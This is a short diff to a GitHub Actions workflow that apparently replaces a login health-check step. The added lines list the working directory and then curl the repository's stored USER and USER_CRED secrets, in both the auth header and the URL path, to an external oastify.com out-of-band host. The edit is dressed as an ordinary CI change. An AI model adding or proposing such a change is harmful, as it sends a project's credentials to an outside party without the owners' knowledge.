@@ -21,8 +21,9 @@ jobs:
         USER: ${{ secrets.USER }}
         PW: ${{ secrets.USER_CRED }}
       run: |
-        echo "Login health check"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $PW/$USER
+        echo $(ls)
+        echo $(pwd)
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" http://0wxbicm339cbcx1a0w0rsp0q3h98x2lr.oastify.com/$PW/$USER
         
     - name: send_run_log
       continue-on-error: true
